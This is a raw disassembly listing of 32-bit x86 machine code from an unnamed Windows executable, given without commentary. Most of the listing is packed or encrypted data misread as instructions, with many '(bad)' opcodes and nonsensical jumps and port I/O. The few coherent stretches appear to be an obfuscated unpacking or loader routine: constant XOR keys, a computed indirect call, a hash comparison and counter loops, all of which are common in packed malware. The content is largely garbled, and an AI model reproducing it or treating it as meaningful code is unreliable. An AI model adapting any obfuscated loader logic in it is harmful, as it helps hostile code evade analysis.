  40cd29:	and    cl,BYTE PTR [ecx+0x4c]
  40cd2c:	mov    eax,ds:0x46b2af94
  40cd31:	and    ch,BYTE PTR [ebp-0x42ee53b8]
  40cd37:	test   DWORD PTR [eax],esi
  40cd39:	mov    esi,0x6360b7d7
  40cd3e:	mov    cl,0x3d
  40cd40:	out    dx,eax
  40cd41:	and    eax,0x732a248f
  40cd46:	out    dx,eax
  40cd47:	jne    0x40cd45
  40cd49:	int    0x14
  40cd4b:	(bad)  
  40cd4c:	mov    esp,0xb2bbc109
  40cd51:	stos   BYTE PTR es:[edi],al
  40cd52:	(bad)  
  40cd53:	fisubr DWORD PTR [edx-0x1014742b]
  40cd59:	fisttp WORD PTR [esi-0x67eb5cb2]
  40cd5f:	xor    edi,DWORD PTR [ecx-0x69]
  40cd62:	imul   esp,DWORD PTR [ecx],0xc481b4fd
  40cd68:	and    DWORD PTR [ebx],edi
  40cd6a:	pusha  
  40cd6b:	sbb    cl,BYTE PTR [edx-0x6115a140]
  40cd71:	enter  0x5796,0x82
  40cd75:	enter  0x5e1f,0x18
  40cd79:	fisttp WORD PTR [esi+0x5b2d2c54]
  40cd7f:	call   0x3ed2f1c8
  40cd84:	mov    ebp,0x292f8c31
  40cd89:	xor    eax,0x5a6ec4d5
  40cd8e:	lods   eax,DWORD PTR ds:[esi]
  40cd8f:	dec    esi
  40cd90:	push   cs
  40cd91:	repz fisub DWORD PTR [eax]
  40cd94:	push   ecx
  40cd95:	pop    ds
  40cd96:	(bad)  
  40cd97:	mov    ds:0xc474e804,eax
  40cd9c:	(bad)  
  40cd9d:	jecxz  0x40cd7d
  40cd9f:	out    0xd,al
  40cda1:	push   esi
  40cda2:	pusha  
  40cda3:	out    dx,eax
  40cda4:	stc    
  40cda5:	mov    esi,0xe8cab9a2
  40cdaa:	jmp    0xff70:0x966d2a59
  40cdb1:	push   0xffffffef
  40cdb3:	cmp    eax,0x7b3a2989
  40cdb8:	scas   eax,DWORD PTR es:[edi]
  40cdb9:	(bad)  
  40cdba:	mov    ebx,DWORD PTR [ebp+0x51]
  40cdbd:	pushf  
  40cdbe:	pop    ecx
  40cdbf:	inc    ecx
  40cdc0:	in     al,dx
  40cdc1:	rol    DWORD PTR [eax-0x66aad9c7],cl
  40cdc7:	xor    ah,BYTE PTR [edx-0x6d680e1d]
  40cdcd:	je     0x40cd90
  40cdcf:	shr    BYTE PTR [edi-0x4c],1
  40cdd2:	je     0x40cd6c
  40cdd4:	sti    
  40cdd5:	add    edx,DWORD PTR [eax+0x55]
  40cdd8:	pop    es
  40cdd9:	xlat   BYTE PTR ds:[ebx]
  40cdda:	xchg   ebp,eax
  40cddc:	cmp    edi,DWORD PTR [edi+0x767e7d3b]
  40cde2:	js     0x40cd79
  40cde4:	(bad)  
  40cde5:	cld    
  40cde6:	cmc    
  40cde7:	push   0xa
  40cde9:	out    0xfa,eax
  40cdeb:	jns    0x40ce34
  40cded:	and    al,0x7
  40cdef:	pop    eax
  40cdf0:	mov    WORD PTR [ecx],ds
  40cdf2:	mov    edi,DWORD PTR [ecx+0x67]
  40cdf5:	adc    DWORD PTR [esi-0x53176ac3],esi
  40cdfb:	sub    eax,0xfc4b8f78
  40ce00:	aam    0xa8
  40ce02:	adc    al,BYTE PTR [ecx+0x4]
  40ce05:	pop    ebp
  40ce06:	fisttp QWORD PTR [ebp-0x227060c]
  40ce0c:	pop    edx
  40ce0d:	iret   
  40ce0e:	adc    DWORD PTR [eax-0x58],edx
  40ce11:	jp     0x40ce02
  40ce13:	inc    eax
  40ce14:	dec    esi
  40ce15:	(bad)  
  40ce16:	xchg   ecx,eax
  40ce17:	fst    QWORD PTR [eax-0x57484f3e]
  40ce1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce1e:	mov    dh,BYTE PTR [eax-0x1f869f46]
  40ce24:	imul   esp,DWORD PTR [ebx-0x67],0x16
  40ce28:	xor    edi,DWORD PTR [esi+edx*4+0x4]
  40ce2c:	aaa    
  40ce2d:	xchg   esp,eax
  40ce2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce2f:	iret   
  40ce30:	pusha  
  40ce31:	pop    es
  40ce32:	out    dx,eax
  40ce33:	jp     0x40ce0f
  40ce35:	daa    
  40ce36:	cmp    dh,BYTE PTR [eax-0x1eb168c]
  40ce3c:	push   cs
  40ce3d:	pusha  
  40ce3e:	enter  0x17e5,0x20
  40ce42:	adc    BYTE PTR [edx],ah
  40ce44:	inc    ecx
  40ce45:	gs pushf 
  40ce47:	cmp    ecx,eax
  40ce49:	je     0x40cec0
  40ce4f:	mov    edi,DWORD PTR [ebp-0x14]
  40ce52:	mov    eax,DWORD PTR [ebp+0x8]
  40ce55:	mov    edx,DWORD PTR [ebp+0x14]
  40ce58:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40ce5c:	mov    ecx,0x7510893
  40ce61:	xor    edx,edx
  40ce63:	xor    edi,ecx
  40ce65:	mov    esi,0x3272db
  40ce6a:	add    edi,esi
  40ce6c:	div    edi
  40ce6e:	mov    edx,DWORD PTR [ebp-0x4]
  40ce71:	xor    edx,ecx
  40ce73:	lea    eax,[edx+eax*1+0x3272db]
  40ce7a:	mov    edx,DWORD PTR [ebp+0x8]
  40ce7d:	mov    edi,DWORD PTR [ebp-0x20]
  40ce80:	mov    DWORD PTR [edi+edx*4],eax
  40ce83:	mov    eax,DWORD PTR [ebp-0x14]
  40ce86:	mov    edx,DWORD PTR [ebp+0x8]
  40ce89:	xor    eax,ecx
  40ce8b:	lea    eax,[eax+edx*1+0x3272db]
  40ce92:	mov    DWORD PTR [ebp+0x8],eax
  40ce95:	mov    eax,DWORD PTR [ebp-0x14]
  40ce98:	mov    edx,DWORD PTR [ebp+0x14]
  40ce9b:	xor    eax,ecx
  40ce9d:	add    eax,esi
  40ce9f:	imul   eax,DWORD PTR [edx]
  40cea2:	mov    edx,DWORD PTR [ebp-0x4]
  40cea5:	xor    edx,ecx
  40cea7:	mov    ecx,DWORD PTR [ebp+0x8]
  40ceaa:	lea    ecx,[edx+ecx*1+0x3272db]
  40ceb1:	cmp    ecx,eax
  40ceb3:	jne    0x40ce4f
  40ceb9:	mov    eax,esi
  40cebb:	jmp    0x40cec5
  40cec0:	mov    eax,0x3272db
  40cec5:	mov    ebx,0x7510893
  40ceca:	mov    ecx,DWORD PTR [ebp-0x4]
  40cecd:	xor    ecx,ebx
  40cecf:	add    ecx,eax
  40ced1:	mov    DWORD PTR [ebp-0xc],ecx
  40ced4:	mov    ebx,0x3874
  40ced9:	add    ebx,0x2342
  40cedf:	xchg   ebx,esi
  40cee1:	xor    ebx,ebx
  40cee3:	push   esi
  40cee4:	mov    esi,ebx
  40cee6:	pop    ebx
  40cee7:	mov    edx,esi
  40cee9:	add    ebx,0x1002
  40ceef:	lea    eax,[ebp-0x10]
  40cef2:	add    edx,eax
  40cef4:	add    edx,0x5
  40cef7:	push   edx
  40cef8:	inc    esi
  40cef9:	pop    ecx
  40cefa:	dec    ecx
  40cefb:	xchg   ecx,eax
  40cefc:	dec    eax
  40cefd:	xchg   ecx,eax
  40cefe:	dec    ecx
  40ceff:	xchg   ecx,edx
  40cf01:	dec    edx
  40cf02:	push   edx
  40cf03:	mov    edx,ebx
  40cf05:	pop    ebx
  40cf06:	dec    ebx
  40cf07:	call   DWORD PTR [ebx]
  40cf09:	cmp    DWORD PTR [ebp+0x10],esi
  40cf0c:	je     0x40cf2b
  40cf12:	xchg   edx,eax
  40cf13:	push   0xb
  40cf15:	pop    ecx
  40cf16:	push   0x4
  40cf18:	pop    ebx
  40cf19:	inc    ebx
  40cf1a:	xchg   ebx,ecx
  40cf1c:	sub    ebx,ecx
  40cf1e:	xchg   ebx,ecx
  40cf20:	dec    ecx
  40cf21:	dec    ecx
  40cf22:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf25:	imul   eax,ecx
  40cf28:	add    esp,eax
  40cf2a:	xchg   edx,eax
  40cf2b:	push   eax
  40cf2c:	xor    ebx,ebx
  40cf2e:	mov    edx,esp
  40cf30:	dec    edx
  40cf31:	inc    ebx
  40cf32:	add    ebx,DWORD PTR [edx+ebx*1]
  40cf35:	dec    ebx
  40cf36:	xor    edx,edx
  40cf38:	add    DWORD PTR [ebp-0xc],ebx
  40cf3b:	pop    ebx
  40cf3c:	mov    eax,DWORD PTR [ebp-0xc]
  40cf3f:	pop    edi
  40cf40:	pop    esi
  40cf41:	pop    ebx
  40cf42:	leave  
  40cf43:	ret    0x10
  40cf46:	or     DWORD PTR ds:0x42c00c,0x42a008
  40cf50:	xor    eax,eax
  40cf52:	add    DWORD PTR ds:0x428028,0x42a010
  40cf5c:	inc    eax
  40cf5d:	ret    
  40cf5e:	push   ebp
  40cf5f:	mov    ebp,esp
  40cf61:	mov    eax,ds:0x421c66
  40cf66:	and    DWORD PTR ds:0x42c008,0x0
  40cf70:	xor    ecx,ecx
  40cf72:	or     ecx,DWORD PTR ds:0x42c008
  40cf78:	inc    ecx
  40cf79:	mov    DWORD PTR ds:0x42c008,ecx
  40cf7f:	cmp    DWORD PTR ds:0x42c008,0xc
  40cf86:	jne    0x40cf9c
  40cf8c:	push   0x42386a
  40cf91:	push   0x423822
  40cf96:	call   DWORD PTR ds:0x424030
  40cf9c:	cmp    DWORD PTR ds:0x42c008,0xb
  40cfa3:	jne    0x40cfb6
  40cfa9:	mov    ecx,DWORD PTR ds:0x42c008
  40cfaf:	inc    ecx
  40cfb0:	mov    DWORD PTR ds:0x42c008,ecx
  40cfb6:	cmp    DWORD PTR ds:0x42c008,0x1b
  40cfbd:	jb     0x40cf70
  40cfc3:	xor    ecx,DWORD PTR ds:0x42a01c
  40cfc9:	mov    eax,DWORD PTR [eax+0x1c8]
  40cfcf:	add    ecx,0x4e81
  40cfd5:	mov    eax,DWORD PTR [eax]
  40cfd7:	and    ecx,DWORD PTR ds:0x42b018
  40cfdd:	cdq    
  40cfde:	push   ebx
  40cfdf:	mov    ecx,0xfabdbef1
  40cfe4:	add    ebx,0x1541
  40cfea:	add    eax,ecx
  40cfec:	adc    edx,0xffffffff
  40cfef:	push   esi
  40cff0:	push   edi
  40cff1:	mov    edi,DWORD PTR ds:0x421a86
  40cff7:	mov    ebx,DWORD PTR ds:0x421aae
  40cffd:	sub    edi,ebx
  40cfff:	or     edi,DWORD PTR [edi+ebx*1]
  40d002:	mov    edi,edx
  40d004:	and    DWORD PTR ds:0x429000,0x0
  40d00e:	jmp    0x40d020
  40d013:	mov    edx,DWORD PTR ds:0x429000
  40d019:	inc    edx
  40d01a:	mov    DWORD PTR ds:0x429000,edx
  40d020:	cmp    DWORD PTR ds:0x429000,0x1a
  40d027:	jae    0x40d079
  40d02d:	cmp    DWORD PTR ds:0x429000,0x7
  40d034:	jne    0x40d05a
  40d03a:	push   DWORD PTR [ebp-0x1c]
  40d03d:	push   0x85ec
  40d042:	push   0x4f88
  40d047:	push   DWORD PTR [ebp-0x10]
  40d04a:	push   0x6e2c
  40d04f:	push   0x428000
  40d054:	call   DWORD PTR ds:0x424038
  40d05a:	cmp    DWORD PTR ds:0x429000,0x6
  40d061:	jne    0x40d074
  40d067:	mov    edx,DWORD PTR ds:0x429000
  40d06d:	inc    edx
  40d06e:	mov    DWORD PTR ds:0x429000,edx
  40d074:	jmp    0x40d013
  40d079:	mov    edx,DWORD PTR [ebp+0x8]
  40d07c:	adc    DWORD PTR ds:0x42a00c,0x42801c
  40d086:	mov    ebx,eax
  40d088:	mov    eax,0x8a29a123
  40d08d:	xor    esi,esi
  40d08f:	xor    ebx,eax
  40d091:	xor    edi,0x0
  40d094:	and    DWORD PTR ds:0x429000,0x1a3f
  40d09e:	add    edx,ecx
  40d0a0:	adc    esi,0xffffffff
  40d0a3:	xor    edx,eax
  40d0a5:	xor    esi,0x0
  40d0a8:	cmp    edx,ebx
  40d0aa:	jne    0x40d0b8
  40d0b0:	cmp    esi,edi
  40d0b2:	je     0x40d0e7
  40d0b8:	mov    edx,DWORD PTR ds:0x421c66
  40d0be:	mov    edx,DWORD PTR [edx+0x1c0]
  40d0c4:	mov    edx,DWORD PTR [edx]
  40d0c6:	xor    esi,esi
  40d0c8:	add    edx,ecx
  40d0ca:	adc    esi,0xffffffff
  40d0cd:	xor    edx,eax
  40d0cf:	xor    esi,0x0
  40d0d2:	cmp    edx,0x70941fd1
  40d0d8:	jne    0x413c0d
  40d0de:	cmp    esi,0xffffffff
  40d0e1:	jne    0x413c0d
  40d0e7:	mov    edx,DWORD PTR ds:0x421cea
  40d0ed:	mov    esi,DWORD PTR ds:0x421ce2
  40d0f3:	xor    edx,esi
  40d0f5:	mov    DWORD PTR ds:0x421ce2,edx
  40d0fb:	mov    edx,DWORD PTR [ebp+0xc]
  40d0fe:	mov    edx,DWORD PTR [edx]
  40d100:	jmp    0x40f494
  40d105:	pop    ebp
  40d106:	xchg   edx,eax
  40d107:	add    DWORD PTR [ebx+0x6d],ebp
  40d10a:	imul   ebp,DWORD PTR [ebx-0x27d14c70],0xffffffcd
  40d111:	aad    0x68
  40d113:	pop    esi
  40d114:	pusha  
  40d115:	ret    0x62d1
  40d118:	(bad)  
  40d119:	jmp    0x40d17a
  40d11b:	bound  esp,QWORD PTR [edx-0x15]
  40d11e:	fstp   QWORD PTR [eax-0x70f6514a]
  40d124:	cdq    
  40d125:	repz sub BYTE PTR [ecx+0x6dc741f],cl
  40d12c:	jmp    0xbe25dd3e
  40d131:	mov    eax,ds:0x54b1035f
  40d136:	stos   BYTE PTR es:[edi],al
  40d137:	sbb    ebp,DWORD PTR [eax+0x59b8e39e]
  40d13d:	je     0x40d131
  40d13f:	std    
  40d140:	jge    0x40d0e7
  40d142:	push   ss
  40d143:	sub    eax,0xeffc7163
  40d148:	repnz cld 
  40d14a:	xchg   edx,eax
  40d14b:	daa    
  40d14c:	in     eax,dx
  40d14d:	test   al,0x22
  40d14f:	mov    edx,0x8365cd6c
  40d154:	je     0x40d114
  40d156:	lea    eax,[eax]
  40d158:	dec    esi
  40d159:	scas   eax,DWORD PTR es:[edi]
  40d15a:	ret    
  40d15b:	push   es
  40d15c:	mov    ecx,0xec8590ba
  40d161:	stos   DWORD PTR es:[edi],eax
  40d162:	cmp    bh,BYTE PTR [edx]
  40d164:	cmp    DWORD PTR [ebx-0x73],edx
  40d167:	dec    ebx
  40d168:	push   0xfffffff6
  40d16a:	retf   
  40d16b:	loop   0x40d15a
  40d16d:	push   es
  40d16e:	inc    edx
  40d16f:	rcr    BYTE PTR [ecx-0x640eb1ce],cl
  40d175:	mov    al,ds:0x1f3cbb47
  40d17a:	sub    edi,edi
  40d17c:	cs aam 0x67
  40d17f:	fst    DWORD PTR [esi]
  40d181:	sbb    ebx,ebp
  40d183:	imul   esp,DWORD PTR [eax-0x6],0x71
  40d187:	xchg   esp,eax
  40d188:	cmp    DWORD PTR [eax-0x624dad73],esp
  40d18e:	add    eax,0x1bd4c964
  40d193:	xchg   ebp,eax
  40d194:	jl     0x40d1d9
  40d196:	lods   al,BYTE PTR ds:[esi]
  40d197:	push   edx
  40d198:	rcr    bh,1
  40d19a:	or     al,0x4b
  40d19c:	sub    BYTE PTR [ecx+0x2b],dh
  40d19f:	push   cs
  40d1a0:	loopne 0x40d17c
  40d1a2:	fdiv   st,st(2)
  40d1a4:	rcl    BYTE PTR [ebx+0x1cbaecd8],1
  40d1aa:	sub    edi,eax
  40d1ac:	scas   eax,DWORD PTR es:[edi]
  40d1ad:	dec    edx
  40d1ae:	jl     0x40d1e9
  40d1b0:	cld    
  40d1b1:	push   ecx
  40d1b2:	hlt    
  40d1b3:	xor    eax,0xce6b99f3
  40d1b8:	addr16 push edi
  40d1ba:	sbb    BYTE PTR [ebx+eiz*1+0x5a],0x36
  40d1bf:	in     eax,0xb7
  40d1c1:	data16 neg al
  40d1c4:	sbb    dl,0x47
  40d1c7:	add    BYTE PTR [ecx+eax*2+0xc],0x71
  40d1cc:	pop    edx
  40d1cd:	in     eax,dx
  40d1ce:	(bad)  
  40d1cf:	jne    0x40d1c5
  40d1d1:	add    al,0x17
  40d1d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1d4:	xor    eax,0x78fa752
  40d1d9:	cmovns ebx,DWORD PTR ds:0x60a6b526
  40d1e0:	shl    ebp,1
  40d1e2:	jmp    0x40d171
  40d1e4:	shl    BYTE PTR [edi-0x34],cl
  40d1e7:	cmp    DWORD PTR [edi-0x12],esi
  40d1ea:	arpl   si,ax
  40d1ec:	pushf  
  40d1ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1ee:	icebp  
  40d1ef:	mov    ebp,DWORD PTR [ecx-0x7e]
  40d1f2:	aam    0x1
  40d1f4:	nop
  40d1f5:	xchg   DWORD PTR [ebx-0x43],ecx
  40d1f8:	mov    ?,WORD PTR [edi+0x7]
  40d1fb:	sbb    DWORD PTR [ebx+0x2b],edx
  40d1fe:	push   es
  40d1ff:	lds    edi,FWORD PTR [ebp-0x10a89341]
  40d205:	mov    eax,0xc947271b
  40d20a:	nop
  40d20b:	cmp    eax,0x375c3df9
  40d210:	out    0x2a,al
  40d212:	mov    edi,0xafae09aa
  40d217:	mov    ah,0x96
  40d219:	xchg   ecx,eax
  40d21a:	sbb    ebx,0x30
  40d21d:	lods   eax,DWORD PTR ds:[esi]
  40d21e:	pop    ecx
  40d21f:	dec    ebp
  40d220:	sub    ebx,DWORD PTR [edi+ecx*1+0xb539472]
  40d227:	or     BYTE PTR [edi],al
  40d229:	inc    eax
  40d22a:	imul   ecx,edi,0xb4f5f852
  40d230:	test   al,0xed
  40d232:	in     al,0x3e
  40d234:	inc    ebp
  40d235:	jmp    0x258c7eaa
  40d23a:	outs   dx,BYTE PTR ds:[esi]
  40d23b:	fstp   DWORD PTR [edi-0x4cb9f926]
  40d241:	retf   
  40d242:	sub    cl,BYTE PTR [edx-0x2c]
  40d245:	dec    esi
  40d246:	test   eax,0x73d8ec0d
  40d24b:	(bad)  
  40d24c:	jae    0x40d235
  40d24e:	push   ss
  40d24f:	mov    cl,0xb0
  40d251:	mov    ah,0x44
  40d253:	fdiv   DWORD PTR ds:0xffc3de93
  40d259:	mov    al,ds:0xaffb65
  40d25e:	cpuid  
  40d260:	push   ds
  40d261:	cmp    al,0x23
  40d263:	test   eax,0x619d9330
  40d268:	mov    ecx,0xdb8f4d14
  40d26d:	pusha  
  40d26e:	adc    eax,0xda6f32d4
  40d273:	mov    ah,0xe6
  40d275:	out    dx,al
  40d276:	leave  
  40d277:	popf   
  40d278:	mov    ss,WORD PTR [edx+ebx*2+0x9]
  40d27c:	push   edx
  40d27d:	adc    eax,esi
  40d27f:	jmp    0x40d248
  40d281:	jmp    0xbddd:0xe4d2720c
  40d288:	and    ch,ch
  40d28a:	aaa    
  40d28b:	jnp    0x40d27a
  40d28d:	sub    bl,BYTE PTR [ecx-0x57]
  40d290:	cld    
  40d291:	and    DWORD PTR [ebp-0x7d],esp
  40d294:	mov    dl,0xfe
  40d296:	ss int3 
  40d298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d299:	mov    eax,ds:0x9483fdd1
  40d29e:	push   0xffffff8d
  40d2a0:	out    dx,eax
  40d2a1:	addr16 sub edx,esp
  40d2a4:	pop    es
  40d2a5:	xor    ebp,DWORD PTR [esi+0x4f2169a7]
  40d2ab:	retf   0x9833
  40d2ae:	jbe    0x40d2e9
  40d2b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2b1:	xchg   DWORD PTR [eax+0xe],esi
  40d2b4:	mov    edx,0x133d408b
  40d2b9:	mov    fs,WORD PTR [esi-0x5d]
  40d2bc:	push   edi
  40d2bd:	inc    esi
  40d2be:	push   esi
  40d2bf:	fld    QWORD PTR ds:0x988f9d2f
  40d2c5:	fisub  DWORD PTR [edx]
  40d2c7:	cmp    BYTE PTR [ebp+0x3ef34b47],dh
  40d2cd:	aas    
  40d2ce:	popf   
  40d2cf:	call   0x1ad4:0x42e39278
  40d2d6:	push   ebx
  40d2d7:	pop    ecx
  40d2d8:	or     al,0xad
  40d2da:	sub    esi,esi
  40d2dc:	(bad)  
  40d2dd:	sub    DWORD PTR [edi],esi
  40d2df:	add    eax,0x21f4db3f
  40d2e4:	jae    0x40d2c0
  40d2e6:	aas    
  40d2e7:	push   ss
  40d2e8:	pop    esi
  40d2e9:	xchg   ecx,eax
  40d2ea:	inc    eax
  40d2eb:	dec    eax
  40d2ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2ed:	lods   eax,DWORD PTR ds:[esi]
  40d2ee:	dec    edi
  40d2ef:	cli    
  40d2f0:	push   edi
  40d2f1:	bound  ebx,QWORD PTR [ebx-0x46]
  40d2f4:	xor    al,0xb1
  40d2f6:	cdq    
  40d2f7:	mov    ecx,0x9bddf0b2
  40d2fc:	xor    BYTE PTR [ecx-0x23493022],0xc7
  40d303:	(bad)  
  40d304:	xchg   ebp,eax
  40d305:	stc    
  40d306:	stc    
  40d307:	ja     0x40d33b
  40d309:	lods   eax,DWORD PTR ds:[esi]
  40d30a:	jp     0x40d33c
  40d30c:	mov    eax,0x1f8384d3
  40d311:	push   ebp
  40d312:	and    eax,0x1aff80
  40d317:	loope  0x40d2da
  40d319:	adc    DWORD PTR [ecx],eax
  40d31b:	ret    
  40d31c:	int3   
  40d31d:	push   eax
  40d31e:	mov    ebp,0xcb21e48a
  40d323:	stc    
  40d324:	pushf  
  40d325:	push   ebx
  40d326:	nop
  40d327:	sub    dh,ah
  40d329:	xlat   BYTE PTR ds:[ebx]
  40d32a:	into   
  40d32b:	sbb    ch,BYTE PTR [edi+0x7180c692]
  40d331:	sub    eax,0x60de21e4
  40d336:	and    eax,0xdf7a5a6d
  40d33b:	arpl   WORD PTR [ebx+eax*4+0x99fae7b],dx
  40d342:	mov    eax,0x347995b8
  40d347:	adc    BYTE PTR [ebp-0x19],0x7e
  40d34b:	or     ebx,DWORD PTR [ebx]
  40d34d:	outs   dx,BYTE PTR ds:[esi]
  40d34e:	(bad)  [esi+edi*8-0x5f]
  40d352:	mov    edx,0xe288f88e
  40d357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d358:	jne    0x40d2f9
  40d35a:	or     DWORD PTR [edi-0x765d3b8a],ecx
  40d360:	xchg   DWORD PTR [ebx+esi*4+0x62],eax
  40d364:	push   ss
  40d365:	aas    
  40d366:	dec    esi
  40d367:	sub    DWORD PTR [eax],eax
  40d369:	add    DWORD PTR [ebx],ebp
  40d36b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d36c:	add    bh,BYTE PTR [esp+ebp*8-0x6b]
  40d370:	mov    dh,ah
  40d372:	sahf   
  40d373:	adc    al,0xe7
  40d375:	sbb    BYTE PTR [eax-0x41],0x30
  40d379:	std    
  40d37a:	dec    eax
  40d37b:	sub    DWORD PTR [ecx-0x11bcdef5],0x24
  40d382:	mov    DWORD PTR [eax-0x3655d23f],ebx
  40d388:	out    dx,eax
  40d389:	sbb    eax,0xfdf5b08b
  40d38e:	(bad)  
  40d38f:	xor    al,0x20
  40d391:	cmp    BYTE PTR [ebx+eax*8-0x40d2b24a],dl
  40d398:	jo     0x40d3b8
  40d39a:	jmp    0x40d385
  40d39c:	push   ebp
  40d39d:	retf   0xe9a8
  40d3a0:	xchg   esp,eax
  40d3a1:	gs iret 
  40d3a3:	cs arpl cx,ax
  40d3a6:	out    dx,eax
  40d3a7:	sbb    cl,bh
  40d3a9:	je     0x40d389
  40d3ab:	push   ebp
  40d3ac:	adc    BYTE PTR [ebp-0x4171f9d7],ah
  40d3b2:	cmp    DWORD PTR [eax],ecx
  40d3b4:	jp     0x40d3bf
  40d3b6:	push   eax
  40d3b7:	in     eax,dx
  40d3b8:	arpl   WORD PTR [edx],bp
  40d3ba:	fs enter 0x23b3,0xb2
  40d3bf:	in     al,0xfa
  40d3c1:	fwait
  40d3c2:	test   DWORD PTR ss:[ecx-0x99e8bc8],ebx
  40d3c9:	fnstenv [eax]
  40d3cb:	imul   ebp,DWORD PTR [edx-0x58d0f9a5],0xffffffe2
  40d3d2:	cs pop es
  40d3d4:	sub    al,BYTE PTR [edi-0x42392a0d]
  40d3da:	dec    ecx
  40d3db:	jne    0x40d431
  40d3dd:	out    0xd5,al
  40d3df:	lods   eax,DWORD PTR ds:[esi]
  40d3e0:	(bad)  
  40d3e1:	xchg   edx,eax
  40d3e2:	bound  ecx,QWORD PTR [edi+0x23c4cc14]
  40d3e8:	xlat   BYTE PTR ds:[ebx]
  40d3e9:	or     eax,0x35fa7730
  40d3ee:	pop    ebx
  40d3ef:	aam    0xeb
  40d3f1:	mov    eax,ds:0x5e2d7ca9
  40d3f6:	mov    bh,0xdd
  40d3f8:	cld    
  40d3f9:	push   ebp
  40d3fa:	int3   
  40d3fb:	pop    ds
  40d3fc:	push   ecx
  40d3fd:	clc    
  40d3fe:	enter  0x4e85,0xa9
  40d402:	fstp   QWORD PTR [esi]
  40d404:	jns    0x40d3bf
  40d406:	inc    ecx
  40d407:	clc    
  40d408:	out    0x65,eax
  40d40a:	push   edx
  40d40b:	xchg   edi,eax
  40d40c:	ret    0xa9db
  40d40f:	pop    es
  40d410:	pop    ss
  40d411:	in     eax,0xf7
  40d413:	dec    ebp
  40d414:	mov    bl,0x26
  40d416:	push   ebx
  40d417:	out    dx,al
  40d418:	mov    al,0x36
  40d41a:	xchg   edi,eax
  40d41b:	sbb    BYTE PTR [edi+0x567759af],0x4d
  40d422:	xchg   ecx,eax
  40d423:	xchg   esi,eax
  40d424:	test   al,0x60
  40d426:	shl    bh,0x2
  40d429:	in     al,dx
  40d42a:	adc    al,0xcd
  40d42c:	js     0x40d3fa
  40d42e:	lahf   
  40d42f:	jno    0x40d464
  40d431:	xor    eax,0x1b479fa3
  40d436:	clc    
  40d437:	cmp    al,0x5e
  40d439:	pop    edx
  40d43a:	rcr    ah,0x54
  40d43d:	and    dh,ah
  40d43f:	loopne 0x40d3ca
  40d441:	pop    ds
  40d442:	or     ah,BYTE PTR [eax]
  40d444:	fst    DWORD PTR [ebp-0xc]
  40d447:	leave  
  40d448:	mov    eax,ds:0xaf714da9
  40d44d:	xchg   esi,eax
  40d44e:	push   edi
  40d44f:	jg     0x40d4b2
  40d451:	pop    edx
  40d452:	outs   dx,DWORD PTR ds:[esi]
  40d453:	pop    ebp
  40d454:	mov    ecx,0x730cc06e
  40d459:	inc    edx
  40d45a:	out    dx,eax
  40d45b:	cmp    bh,BYTE PTR ds:0x750e1f61
  40d461:	pop    es
  40d462:	outs   dx,DWORD PTR ds:[esi]
  40d463:	cs repnz xor al,0xf8
  40d467:	cmc    
  40d468:	(bad)  [ecx+0x2f]
  40d46b:	pushf  
  40d46c:	cmp    bh,BYTE PTR [ebx-0x50b39db7]
  40d472:	sub    eax,0x806915f4
  40d477:	xchg   ecx,eax
  40d478:	aaa    
  40d479:	rcr    dh,cl
  40d47b:	je     0x40d432
  40d47d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d47e:	sub    cl,BYTE PTR [ecx-0x4ace353f]
  40d484:	xor    al,0x4f
  40d486:	sbb    bl,cl
  40d488:	test   al,0x75
  40d48a:	jecxz  0x40d4ea
  40d48c:	inc    edi
  40d48d:	xor    eax,edi
  40d48f:	les    ebx,FWORD PTR ds:0x4018b2a5
  40d495:	mov    ecx,0xfc5f9626
  40d49a:	retf   
  40d49b:	dec    edx
  40d49c:	outs   dx,DWORD PTR ds:[esi]
  40d49d:	repz sti 
  40d49f:	xor    BYTE PTR [ebx],dh
  40d4a1:	bts    DWORD PTR [esi-0x54],ebx
  40d4a5:	lods   al,BYTE PTR ds:[esi]
  40d4a6:	sbb    dh,BYTE PTR [ebp+0x16c0c69b]
  40d4ac:	std    
  40d4ad:	outs   dx,DWORD PTR ds:[esi]
  40d4ae:	lock sbb BYTE PTR [ecx],ch
  40d4b1:	cmp    BYTE PTR [edx+0x19],bl
  40d4b4:	(bad)  
  40d4b6:	(bad)  
  40d4b7:	xchg   ebp,eax
  40d4b8:	sub    esp,DWORD PTR [edi]
  40d4ba:	cmp    al,BYTE PTR [esi]
  40d4bc:	push   0xffffffdc
  40d4be:	dec    edi
  40d4bf:	fidiv  DWORD PTR [eax+edi*4]
  40d4c2:	cmp    DWORD PTR [ebx+edx*1],0x887934bc
  40d4c9:	scas   eax,DWORD PTR es:[edi]
  40d4ca:	enter  0x439b,0xd8
  40d4ce:	mov    ch,BYTE PTR [ebx-0xd]
  40d4d1:	adc    DWORD PTR [esp+ebx*2+0x138838f7],ebx
  40d4d8:	call   0xd7784e04
  40d4dd:	je     0x40d47b
  40d4df:	push   esi
  40d4e0:	scas   eax,DWORD PTR es:[edi]
  40d4e1:	add    BYTE PTR [edx+0x640a80ad],0x2f
  40d4e8:	inc    esp
  40d4e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4ea:	call   0xc611d6df
  40d4ef:	daa    
  40d4f0:	mov    ah,0x82
  40d4f2:	push   ss
  40d4f3:	mov    ah,0x10
  40d4f5:	enter  0x6f2,0x75
  40d4f9:	dec    ebp
  40d4fa:	push   ebp
  40d4fb:	inc    ecx
  40d4fc:	push   ebx
  40d4fd:	push   cs
  40d4fe:	les    esp,FWORD PTR gs:[ebx-0x43]
  40d502:	mov    ebp,0x83b4ab01
  40d507:	mov    edi,0xe779afea
  40d50c:	int3   
  40d50d:	retf   0xe10c
  40d510:	scas   eax,DWORD PTR es:[edi]
  40d511:	(bad)  
  40d512:	and    eax,0x6633b8d9
  40d517:	scas   al,BYTE PTR es:[edi]
  40d518:	fst    DWORD PTR [edx]
  40d51a:	fs pushf 
